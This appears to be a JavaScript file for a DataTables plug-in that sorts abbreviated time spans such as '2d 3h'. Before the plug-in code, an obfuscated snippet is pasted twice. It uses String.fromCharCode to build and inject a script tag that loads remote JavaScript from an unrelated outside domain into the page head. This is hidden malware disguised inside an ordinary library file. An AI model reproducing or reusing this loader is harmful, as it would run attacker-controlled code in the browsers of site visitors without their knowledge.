Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Created by caochenghua on 2016/12/22.
 */

/**
 * When dealing with time elapsed, it is common to append a post fix
 * such as d(day), h(hour), m(minute) or s(second) to a string in order to easily denote the brief duration
 * of the time span from now. This plug-in allows sorting to take these
 * indicates of size into account.
 *
 * A counterpart type detection plug-in is also available.
 *
 *  @name Time span
 *  @summary Sort abbreviated time span correctly (2d 3h, 2h 8m, 3m 8s, 30s, etc)
 *  @author Allan Jardine - datatables.net
 *
 *  @example
 *    $('#example').DataTable( {
 *       columnDefs: [
 *         { type: 'time-elapsed-dhms', targets: 0 }
 *       ]
 *    } );
 */


jQuery.fn.dataTable.ext.type.order['time-elapsed-dhms-pre'] = function(data) {

    var matches = data.match(/^(\d+(?:\.\d+)?)\s*([a-z]+)/i);
    var multipliers = {
        s: 1,
        m: 60,
        h: 3600,
        d: 86400
    };

    if (matches) {
        var multiplier = multipliers[matches[2].toLowerCase()];
        return parseFloat(matches[1]) * multiplier;
    } else {
        return -1;
    };
};